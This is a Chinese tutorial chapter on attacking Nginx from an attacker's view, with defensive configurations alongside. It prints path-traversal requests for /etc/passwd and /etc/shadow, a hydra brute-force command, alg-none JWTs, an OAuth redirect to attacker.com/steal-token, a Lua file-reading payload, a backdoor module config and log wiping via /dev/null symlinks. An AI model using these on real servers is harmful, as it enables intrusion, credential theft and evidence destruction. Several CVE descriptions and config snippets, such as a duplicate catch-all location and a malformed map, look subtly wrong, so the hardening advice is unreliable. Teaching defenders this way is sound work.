# 第 2 章：攻击者视角——五步一气呵成

上一章我们看了 Nginx 为什么是头号入口。现在，我们把视角**切换到攻击者**。

如果互联网是一栋大楼，Nginx 就是大楼的**前台**——它接受访客请求，把访客引导到正确的部门（upstream），记录访客行为。攻击者要做的第一件事，就是假装自己是正常访客，在前台的对话中摸清大楼的地图。

这一章，我们沿着攻击者的五步路径展开：

```
摸配置 → 找路径 → 绕认证 → 提权 → 隐攻击
```

每一步都有三个层次：**攻击者怎么做**（PoC）、**防御者怎么看**（日志/监控）、**踩过的坑**（真实事故）。这样您读完一章，就能立刻检查自己生产的 Nginx 有没有类似问题。

## 攻击者视角的总览

先看攻击者的完整流程地图：

```
┌─────────────────────────────────────────────────────┐
│                 攻击者进入 Nginx                      │
├─────────────────────────────────────────────────────┤
│ ① 摸配置                                            │
│    ├─ Server 头指纹 → 知道版本号 → 查可用的 CVE       │
│    ├─ 错误页指纹 → 看到 404/403 页面样式              │
│    └─ 默认页 → 看到 "Welcome to nginx!"              │
├─────────────────────────────────────────────────────┤
│ ② 找路径                                            │
│    ├─ 目录扫描 → .git/ .env/ /backup/ /admin/        │
│    ├─ alias misconf → 目录遍历 → /etc/passwd          │
│    └─ 静态文件泄露 → 前端源码 → API 密钥              │
├─────────────────────────────────────────────────────┤
│ ③ 绕认证                                            │
│    ├─ HTTP Basic Auth 爆破                           │
│    ├─ JWT alg none 攻击                              │
│    └─ OAuth redirect_uri 绕过                        │
├─────────────────────────────────────────────────────┤
│ ④ 提权                                              │
│    ├─ CVE-2021-23017 → worker RCE                   │
│    ├─ 动态模块注入 → 加载恶意 .so                     │
│    └─ Lua/NJS 沙箱逃逸                              │
├─────────────────────────────────────────────────────┤
│ ⑤ 隐攻击                                            │
│    ├─ 日志污染 → 换行注入 / 伪造访问者 IP              │
│    ├─ 日志黑洞 → ln -sf /dev/null 替换日志             │
│    └─ HTTP/2 走私 → 绕过 WAF 检测                    │
└─────────────────────────────────────────────────────┘
```

攻击者的时间线通常是这样的：

- **前 30 秒**：指纹识别，确定 Nginx 版本和配置组件
- **前 5 分钟**：批量扫描目标服务器的所有路径、文件、参数
- **前 30 分钟**：如果发现认证接口，开始爆破
- **持久期**：拿到权限后，清理痕迹 + 建立持久化后门

作为防御者，了解这一整套流程不是为了恐慌——而是为了**在每个环节都竖墙**。如果攻击者更早撞墙，他们就会离开。

## 第一步：摸配置——指纹识别与版本探测

Nginx 默认暴露的信息非常丰富。攻击者的第一个动作，就是拿这些信息拼出目标机器的安全等级。

### Server 头指纹

最简单的探测：

```bash
# 查看 Server 头是否泄漏版本
$ curl -I https://target.com/
HTTP/1.1 200 OK
Server: nginx/1.18.0                    # ← 版本号曝光！
```

**如果没 `server_tokens off`**，攻击者看到 `nginx/1.18.0` 就能立刻关联到以下 CVE：

| CVE | 影响版本 | 危害 |
|---|---|---|
| CVE-2021-23017 | 0.6.18 - 1.20.0 | RCE |
| CVE-2017-7529 | 0.5.6 - 1.13.2 | 信息泄露 |
| CVE-2021-3618 | 0.6.18 - 1.20.0 | 权限提升 |
| CVE-2024-24989 | 1.18.0 - 1.24.0 | DoS |

如果版本在受影响的范围内，攻击者会直接用 public PoC 尝试。**一个正确的配置抹掉版本号，就能让攻击者多花 10 分钟**——这 10 分钟可能就是检测到入侵并响应的窗口。

### 错误页指纹

Nginx 有自己风格的 404/403/500 错误页。访问不存在的路径就能看到：

```bash
# 触发 404，看响应体
$ curl https://target.com/nonexistent-path
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
```

**这里有两个指纹泄露**：
1. 版本号 `nginx/1.18.0` 在错误页里（`server_tokens off` 能抹掉）
2. Nginx 风格的内嵌页面——攻击者能直接确认是 Nginx，排除 Apache/IIS

**最小化暴露**：

```nginx
server_tokens off;        # 去掉版本号
error_page 404 403 500 502 503 504 /custom_error.html;

# 自定义 404（不让攻击者看到 Nginx 风格）
location /custom_error.html {
    root /var/www/error_pages/;
    internal;              # 禁止外部直接访问这个 URL
}
```

### 默认页指纹

很多新上线的服务没改默认 index.html：

```bash
$ curl https://new-service.target.com/
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
...
```

这是最危险的指纹——它在告诉攻击者：**这台机器刚上线，配置可能不完整**。遗留配置、未改的默认密码、开放的内部端口——这些都是刚上线机器的常见问题。

**修复**：总有一个 `default_server` 返回 444（空响应）或 redirect 到正确域名。

```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    return 444;    # 不返回任何内容，直接断开连接
}
```

### 接口发现：扫描工具实战

攻击者不会手动 curl 每条路径——他们用工具：

```bash
# dirsearch：常用路径爆破
$ python3 dirsearch.py -u https://target.com -e php,asp,aspx,jsp,html,txt,json

# gobuster：更快，支持 Wordpress / SiteMap / API 等多种字典
$ gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# ffuf：最快的模糊测试工具
$ ffuf -u https://target.com/FUZZ -w api-endpoints.txt -mc 200,403,401
```

**它找到什么**？典型的敏感路径：

```bash
/.git/                  → 整个仓库的源码（含数据库密码、API key）
/.env                   → 环境变量（含密钥、token）
/backup/                → 数据库备份文件
/admin/                 → 管理后台
/api/swagger.json       → API 文档（含内部接口）
/server-status          → Nginx 当前状态页面
/nginx_status           → Nginx 统计信息
```

### 踩过的坑：一家创业公司的 .git 暴露事故

**时间**：2023 年
**受害方**：A 轮 SaaS 创业公司

攻防流程：

1. 攻击者用 dirsearch 扫描，发现目标域名的 `/.git/` 返回 200
2. 用 [git-dumper](https://github.com/arthaud/git-dumper) 下载整个 `.git` 目录
3. 在 git log 中找到三年前的 commit 里硬编码了 AWS Secret Key
4. 用该密钥访问目标 S3 存储桶，拿到用户数据 500 万条

**Nginx 配置错误**：

```nginx
# 错的：location 没写正则排除
server {
    root /var/www/html;
    # 攻击者直接访问 /.git/ 就能拿到全部 commit
}
```

**修复**：

```nginx
# 对的：显式拒绝 .git 目录
location ~ /\.(?!well-known) {
    deny all;
    return 404;
}
```

**更健壮的**：

```nginx
# 或者用 map + 变量拒绝
map $uri $blocked {
    ~/\.git/ 1;
    ~/\.env 1;
    ~/\.svn/ 1;
    default 0;
}

server {
    if ($blocked) {
        return 444;
    }
}
```

## 第二步：找路径——URL 枚举与敏感文件泄漏

摸清版本后，攻击者开始枚举路径。Nginx 的路径处理（尤其是 `alias` 和 `root` 的区别）是所有配置问题中最容易出安全漏洞的。

### alias vs root：一个 / 的差别

这是 Nginx 新手最常踩的坑，也是攻击者最喜欢的漏洞。

```nginx
# root：document root + URL 路径
location /static/ {
    root /var/www/html;
}
# 访问 /static/style.css → /var/www/html/static/style.css

# alias：URL 路径映射到磁盘路径
location /static/ {
    alias /var/www/;
}
# 访问 /static/style.css → /var/www/style.css
# ⚠️ 注意 alias 不会把 location 的 `/static/` 加回去
```

**常见的 alias 配置错误**：

```nginx
# 错误 1：location 匹配器结尾没有 /
location /static {
    alias /var/www/;
}
# 访问 /static../etc/passwd → /var/www/../etc/passwd ← 目录遍历！

# 错误 2：alias 路径结尾没有 /
location /static/ {
    alias /var/www;   # 没有 / 结尾
}
# 访问 /static/../etc/passwd → /var/www/../etc/passwd ← 目录遍历！

# 正确：
location /static/ {
    alias /var/www/;  # 两边都有 /
}
```

**攻击者怎么利用**（PoC）：

```bash
# 如果 alias 错误配置
$ curl https://target.com/static../etc/passwd
root:x:0:0:root:/root:/bin/bash

# 拿到 shadow 位置后再根据 /etc/passwd 里的用户遍历
$ curl https://target.com/static../../etc/shadow
root:$6$xyz...:19721:0:99999:7:::
```

**防御**：拒绝 `..` 路径的请求：

```nginx
location ~ /\.\. {
    deny all;
    return 403;
}

# 或者用正则拒绝任何包含 .. 的请求（更严格）
if ($uri ~* "\.\.") {
    return 403;
}
```

### 敏感文件目录枚举

除了 `../` 攻击，攻击者还会枚举常见的敏感文件：

```bash
# 常见的后端源码目录
/backup/            # 数据库备份
/backup/
/api/internal/
/admin/
/vendor/            # PHP/Laravel 的 composer vendor
/phpinfo.php        # 遗留的 phpinfo 页
/wp-admin/          # WordPress
```

**为什么这些路径容易暴露**？

因为很多开发者在 `nginx.conf` 里这样写：

```nginx
server {
    root /var/www/html;
    # ... 没有其他 location 限制

    location /api/ {
        proxy_pass http://backend:8000/;
    }
}
```

**问题**：`/backup/` 不存在于 `location` 定义里 → Nginx 用 `root` 的路径去磁盘上找 → 如果磁盘上碰巧有个 `/var/www/html/backup/` 目录 → **整个备份目录对外暴露**。

**修复**：显式拒绝所有未定义的 location：

```nginx
# 定义明确的 location，其余全部拒绝
location / {
    try_files $uri $uri/ @app;
}

location @app {
    proxy_pass http://backend:8000;
}

# 黑洞 location（匹配所有没被上面匹配到的）
location / {
    deny all;
    return 404;
}
```

### 静态文件泄露：前端源码 → API 密钥

现代前端常把 API 请求打在 JavaScript 源码里。如果 Nginx 配置不对，攻击者直接看源码就能找到未授权 API 入口。

```bash
# 攻击者工具：SourceMap 扫描
$ curl https://target.com/js/app.hashchunk.js
# 找到 API 调用
fetch('/api/internal/users/' + userId + '/tokens')
# 直接测试这个内部 API 能否外部访问
$ curl https://target.com/api/internal/users/1/tokens
{"error":"authenticated"}  # ← 有认证？好，试一下绕过
```

**防御**：不要依赖"隐藏内部 API 路径"来保护它们——攻击者会在前端 JS 里找到入口。**对 /api 路径做严格的访问控制**。

```nginx
location /api/ {
    # 正确的做法：API 入口做统一认证
    auth_jwt "API";
    auth_jwt_key_file /etc/nginx/jwt_public_key.pem;

    proxy_pass http://api-backend:8000/;
}
```

## 第三步：绕认证——HTTP Basic Auth 与 JWT 漏洞

摸清路径后，攻击者会尝试攻破认证。

### HTTP Basic Auth 弱密码爆破

在 2025 年——TLS 1.3 和 JWT 的时代——仍有大量 Nginx 配置只用 HTTP Basic Auth 保护管理后台：

```nginx
location /admin/ {
    auth_basic "Restricted Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
```

**为什么危险**：

1. **无速率限制**：Nginx 默认不对 `/admin/` 做认证频率限制
2. **弱密码常见**：`admin/admin`、`root/root`、`nagios/nagios`
3. **Basic Auth 不保护密码传输**（即使走 HTTPS，协议头是明文 base64 编码）

**攻击者工具**：

```bash
# hydra - 常见的 HTTP Basic Auth 爆破
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    target.com http-get /admin/
[80][http-get] host: target.com   login: admin   password: nginx123
```

**防御**：

```nginx
# 1. 限流
location /admin/ {
    # 限制到 /admin/ 的请求频率
    limit_req zone=admin_login burst=5 nodelay;

    auth_basic "Restricted Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
}

# 2. IP 白名单 + VPN 强制
location /admin/ {
    # 只允许内网 IP 访问
    allow 10.0.0.0/8;
    allow 172.16.0.0/12;
    deny all;

    auth_basic "Restricted Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
```

### JWT `alg: none` 攻击

Nginx 从 1.25 开始原生支持 `auth_jwt` 模块。如果你的上游服务用 JWT 做认证，攻击者可能尝试 JWT 算法混淆攻击。

```http
# 攻击者构造的 JWT（alg = none）
POST /api/transfer HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiAibm9uZSJ9.ew0KICAidXNlcl9pZCI6IDEyMzQ1NiwNCiAgInJvbGUiOiAiYWRtaW4iDQp9.
```

这个 JWT 的 payload 是 `{"user_id": 123456, "role": "admin"}`，`alg: none` 意味着**没有签名**。如果 JWT 验证实现有问题，攻击者就能直接通过认证。

**Nginx auth_jwt 的防御**：默认支持 `auth_jwt_key` 后，会强制要求签名验证。但要检查配置：

```nginx
# 正确的配置
location /api/ {
    auth_jwt "API";
    auth_jwt_key_file /etc/nginx/jwt_public_key.pem;

    # 可选：要求 JWT 必须包含某个字段
    auth_jwt_require $jwt_claim_role "admin";

    proxy_pass http://api-backend:8000/;
}
```

**攻击者绕过尝试**：

```bash
# 尝试 alg none
$ curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
    https://target.com/api/admin/users
{"error":"401 Unauthorized"}  # → 好的，Nginx auth_jwt 有签名验证
```

### OAuth redirect_uri 绕过

Nginx 经常被配置处理 OAuth 的回调路径：

```nginx
location /auth/callback {
    proxy_pass http://auth-service:9000/auth/callback;
}
```

攻击者可能尝试 redirect_uri 注入：

```http
GET /auth/callback?redirect_uri=https://attacker.com/steal-token HTTP/1.1
Host: target.com
```

如果 Nginx 不验证 redirect_uri，攻击者能引导用户跳转到恶意站点，窃取 OAuth 授权码。

**防御**：

```nginx
# 1. 白名单 redirect_uri
server {
    # 只有这个来源的 redirect_uri 是允许的
    location /auth/callback {
        if ($arg_redirect_uri !~ "^https://app\.target\.com/auth/callback") {
            return 400 "Invalid redirect_uri";
        }
        proxy_pass http://auth-service:9000/auth/callback;
    }
}

# 2. 或者用 map 做白名单（更安全）
map $arg_redirect_uri $allowed_redirect {
    "~^https://app\.target\.com/auth/callback"  return;
    "~^https://app2\.target\.com/auth/callback"  return;
    default                                       deny;
}

server {
    location /auth/callback {
        set $redirect_allowed 0;
        if ($allowed_redirect) {
            set $redirect_allowed 1;
        }
        if ($redirect_allowed = 0) {
            return 400;
        }
        proxy_pass http://auth-service:9000;
    }
}
```

## 第四步：提权——从 Nginx worker 到 root

前三步只是"摸清地图"。如果攻击者只走到了第三步，他们能做的只是"看了不该看的数据"。**真正的危险从第四步开始**——被攻击的 worker 进程有系统访问能力。

### CVE-2021-23017：DNS 解析器 RCE 利用链

**触发条件**：

```nginx
# resolver 指令—用于动态 upstream 解析
location /api/ {
    resolver 8.8.8.8;   # ← 这里是攻击面
    proxy_pass http://dynamic-backend.example.com;
}
```

**攻击步骤**：

1. 攻击者知道目标 Nginx 用了 `resolver`（扫描 Server 头？发现版本 1.18.0）
2. 攻击者等一个能控制的 DNS 响应——比如，让目标访问 `dynamic-backend.example.com`（如果攻击者能拿到这个域名的 DNS 控制）
3. Nginx resolver 解析域名 → 触发 off-by-one → shellcode 在 worker 里执行

**真正可怕的地方**：**HTTP 日志里看不到 DNS 查询记录**。Nginx access log 只记录 HTTP 请求，不记录 DNS 查询。被攻击后，ES 仪表盘上是干净的，系统日志是干净的——攻击者已经进来执行 shellcode 了，而你还在看页面报 500 的错误告警。

**修复**（除了升级）：

```nginx
# 替换 resolver 方案：用 upstream 的 resolv 文件
# 或用 set 变量 + proxy_pass 直连 IP
upstream backend {
    server 10.0.1.1:8000;
    server 10.0.1.2:8000;
}

location /api/ {
    proxy_pass http://backend;
}
```

### 动态模块注入

Nginx 支持通过 `load_module` 加载动态模块。如果攻击者通过某种方式写了一个 `.so` 文件到系统磁盘上，他们可以通过加载恶意模块劫持 Nginx。

```nginx
# 攻击者构造的配置
load_module /tmp/malicious.so;

http {
    server {
        listen 80;
        location /backdoor {
            # 恶意模块处理这个路径
            set $cmd $arg_cmd;
            run_malicious $cmd;   # 执行系统命令
        }
    }
}
```

**防御**：

```nginx
# 1. 只加载已签名模块
load_module /usr/lib/nginx/modules/ngx_stream_module.so;
load_module /usr/lib/nginx/modules/ngx_http_geoip_module.so;

# 2. 模块文件设置不可变属性
$ sudo chattr +i /usr/lib/nginx/modules/*.so

# 3. 定期校验模块 hash（cron）
$ sha256sum /usr/lib/nginx/modules/*.so > /var/log/nginx/module_hash.db
```

### Lua/NJS 沙箱逃逸

如果你用 OpenResty 或 NJS（Nginx JavaScript），注意沙箱逃逸：

```lua
-- 攻击者在 URL 中注入的 payload
GET /test.lua?cmd=system('cat /etc/shadow') HTTP/1.1

-- OpenResty Lua 处理
location /test.lua {
    content_by_lua_block {
        local cmd = ngx.var.arg_cmd
        if cmd then
            local f = io.open(cmd)
            if f then
                ngx.print(f:read("*all"))
                f:close()
            end
        end
    }
}
```

**这行代码**：`io.open(cmd)` → 如果 `cmd` 是文件路径，直接读取文件内容返回给攻击者。没有沙箱、没有路径白名单、没有权限检查。

**防御**：

```lua
-- OpenResty 安全版本
location /test.lua {
    access_by_lua_block {
        -- 1. 拒绝所有非 /proc 路径
        local args = ngx.req.get_uri_args()
        local path = args.path or "/proc/self/status"
        
        -- 路径白名单
        local allowed = {
            ["/proc/self/status"] = true,
            ["/proc/self/maps"] = true,
        }
        
        if not allowed[path] then
            ngx.exit(403)
        end
    }

    content_by_lua_block {
        -- 2. 只读模式打开文件
        local f = io.open("/proc/self/status", "r")
        ngx.print(f:read("*all"))
        f:close()
    }
}
```

## 第五步：隐攻击——日志污染与请求伪装

这一步是攻击链的终局——攻击者已经拿到了 worker 权限。现在他们要做什么？**让 Nginx "看不见"攻击**。

### 日志污染：换行注入

Nginx access log 默认记录 HTTP 请求行。如果攻击者能在请求里嵌入换行符（`\r\n`），他们能**污染日志文件**。

```http
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
X-Forwarded-For: 127.0.0.1\r\n2001:db8::1
```

如果日志格式是 `$http_x_forwarded_for`，这个注入会让日志产生以下内容：

```
192.168.1.1 - - [23/Jul/2026:10:00:00 +0800] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0" "127.0.0.1"
2001:db8::1"    ← 注入的行！日志分析器会解析为第二行记录
```

**防御**：

```nginx
# 1. 对日志变量做过滤
log_format main escape=json
    '$remote_addr - $remote_user [$time_local] "$request" '
    '$status $body_bytes_sent "$http_referer" '
    '"$http_user_agent" "$http_x_forwarded_for"';

# escape=json 会自动对特殊字符转义

# 2. 不要直接在日志里记录请求体
log_format full
    '$remote_addr - $remote_user [$time_local] "$request" '
    '$status $body_bytes_sent "$http_referer" '
    '"$http_user_agent"';

# ❌ 不要这样写：$request_body 会记录完整的 POST 内容，包括注入
```

### 日志黑洞：ln -sf /dev/null

这一节介绍的就是文章开头提到的攻击手法。攻击者如果拿到了 shell（不一定 root，nginx worker 的权限也能写 log 目录），他们会：

```bash
# 攻击者执行
$ cd /var/log/nginx
$ mv access.log access.log.old
$ ln -sf /dev/null access.log

# 从此之后，所有 Nginx 请求日志都流向 /dev/null
# access.log 在 ls 里看起来还是存在，但 inode 指向黑洞
```

**检测**：

```bash
# 检查 access.log 的 inode
$ ls -li /var/log/nginx/access.log
316312 -rw-r--r-- 1 nginx nginx 0 Jul 23 10:00 /var/log/nginx/access.log
# 如果 size 长期为 0，或者 inode 数字异常（指向 /dev/null），就是被改过

# 定期检查 log 目录的文件 inode
$ find /var/log/nginx/ -type f -links 1 -size 0 -exec ls -li {} \;

# 或者用 auditd 监控
$ auditctl -w /var/log/nginx/access.log -p wa -k nginx-log-tampering
```

### IP 伪装：X-Forwarded-For 伪造

Nginx 默认信任 `X-Forwarded-For` 头。攻击者伪造 IP，就能绕过基于 IP 的访问限制：

```http
GET /admin/ HTTP/1.1
Host: target.com
X-Forwarded-For: 10.0.0.1, 10.0.0.2, 10.0.0.3
```

如果 Nginx 没配置 `real_ip` 模块做可信 proxy 链校验，会直接信任最左端的 IP，攻击者就能绕到 `/admin/`。

**正确配置**：

```nginx
# 只有在已知代理后面才信任 X-Forwarded-For
set_real_ip_from 10.0.0.0/8;    # 只信任内网上游
set_real_ip_from 172.16.0.0/12;
set_real_ip_from 192.168.0.0/16;
real_ip_header X-Forwarded-For;
real_ip_recursive on;           # 递归解包（取最右边的可信 IP）
```

### HTTP/2 走私攻击

HTTP/2 有优先级帧和流控制机制。攻击者能利用 Nginx HTTP/2 实现的死角进行请求走私：

```http
PRI * HTTP/2.0

SETTINGS
PRIORITY (stream 1, weight 255)

# 攻击者在 stream 1 发送一个欺诈请求
HEADERS
:method: POST
:path: /api/admin
:authority: internal-backend
content-length: 0

# 在 stream 2 发送正常的请求
HEADERS
:method: GET
:path: /api/health
:authority: target.com
```

如果 Nginx 的 HTTP/2 实现没有正确处理 stream 绑定，欺诈请求 `<internal-backend>` 可能被 upstream 解析为合法请求，访问内部服务。

**防御**：升级到 Nginx 1.25.3+，配置 HTTP/2 限流：

```nginx
http {
    keepalive_requests 1000;
    http2_max_concurrent_streams 128;
    http2_recv_timeout 10s;
}
```

## 攻击者视角的总结：五种"见面礼"

攻击者的五步路径结束后，我们得到了五个清单——每一件都是攻击者**对您的 Nginx 配置的"见面礼"**：

| # | 攻击步骤 | 攻击者做了什么 | 防御者该检查什么 |
|---|---|---|---|
| 1 | 摸配置 | 扫 Server 头 / 错误页 / 默认页 | `server_tokens off` + 自定义错误页 |
| 2 | 找路径 | 目录扫描 + 遍历 + 源码泄露 | 拒绝 `.git/` + 检查 `alias` 配置 |
| 3 | 绕认证 | Basic Auth 爆破 / JWT 攻击 | `limit_req` + JWT key + redirect_uri 校验 |
| 4 | 提权 | CVE 利用 / 模块注入 / 沙箱逃逸 | 升级 Nginx + 定期扫描 CVE + 模块签名 |
| 5 | 隐攻击 | 日志污染 / 黑洞 / IP 伪装 | `escape=json` + auditd + `set_real_ip_from` |

下一章，我们将切换到防御者视角。五层纵深防御体系将系统性地解决以上所有五个攻击步骤——每一层对应攻击者的一条路径。

---

### 自测题

**题 1（指纹）**：用一行命令绕过 `server_tokens off` 判断 Nginx 版本。

<details>
<summary>参考答案</summary>

`curl -I https://target.com/` 查看 Server 头，但 `server_tokens off` 会抹掉版本号。可以尝试触发错误页来查看错误页里是否带版本号（有些老版本 Nginx 在错误页里仍然显示版本号，即使 `server_tokens off` 已配置）。

更准确的识别法：通过特定文件的 MDS 指纹（favicon.ico / 默认 404 页的 SHA256）。
</details>

**题 2（认证）**：您生产 Nginx 的 `/admin/` 路径有哪种认证方式？有速率限制吗？

<details>
<summary>检查清单</summary>

- 是否只用 HTTP Basic Auth？→ 加上 IP 白名单或 VPN
- 有没有 `limit_req`？→ 加：`limit_req zone=admin_login burst=5 nodelay;`
- 有没有 `allow 10.0.0.0/8; deny all;`？→ 只允许内网来源
- 有没有 audit log？→ `/var/log/nginx/admin-access.log` 独立日志
</details>

**题 3（日志安全）**：检查 `/var/log/nginx/access.log` 的 inode，确认不是 symlink 到黑洞。

<details>
<summary>检查命令</summary>

```bash
# 看 inode
$ ls -li /var/log/nginx/access.log
# 如果文件是 symlink，ls 会在末尾显示 -> 目标路径

# 看真实的设备
$ readlink -f /var/log/nginx/access.log
/var/log/nginx/access.log  # 正常：路径跟自己一致
/dev/null                   # 异常：被重定向到黑洞！

# 检查文件大小长期为 0
$ if [ -f /var/log/nginx/access.log ] && [ ! -L /var/log/nginx/access.log ] && [ $(stat -c%s /var/log/nginx/access.log) -eq 0 ]; then echo "WARNING: access.log is empty and not symlink - investigate"; fi
```
</details>